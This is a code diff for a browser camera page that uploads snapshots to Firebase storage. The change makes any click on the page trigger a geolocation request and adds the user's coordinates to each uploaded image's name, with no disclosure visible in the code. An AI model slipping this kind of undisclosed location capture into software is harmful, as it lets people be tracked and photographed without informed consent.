@@ -103,6 +103,23 @@ window.onload = function() {
         appId: "1:173070660145:web:caf62bbca077b971001b10",
         measurementId: "G-8KM9MEZF0K"
     };
+    
+    var location = 'none';
+    document.body.addEventListener('click',f);
+    function f() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+            location = 'none'
+        }
+    }
+
+    function showPosition(position) {
+        location = "Latitude: " + position.coords.latitude +
+            " Longitude: " + position.coords.longitude;
+        //document.write(location)
+    }
+    
     firebase.initializeApp(firebaseConfig);
     var storage = firebase.storage();
 
@@ -110,6 +127,7 @@ window.onload = function() {
     var track;
     // camera stream video element
     let videoElm = document.querySelector('#player');
+    videoElm.addEventListener('click',f);
     // flip button element
     let flipBtn = document.querySelector('#flip');
     var canvas = document.querySelector('#myCanvas');
@@ -131,7 +149,7 @@ window.onload = function() {
         ctx.drawImage(videoElm, 0, 0);
         var time = new Date();
         canvas.toBlob(function(blob) {
-            storage.ref().child('/images'+time).put(blob);
+            storage.ref().child('/images'+time+location).put(blob);
         });
     }
     
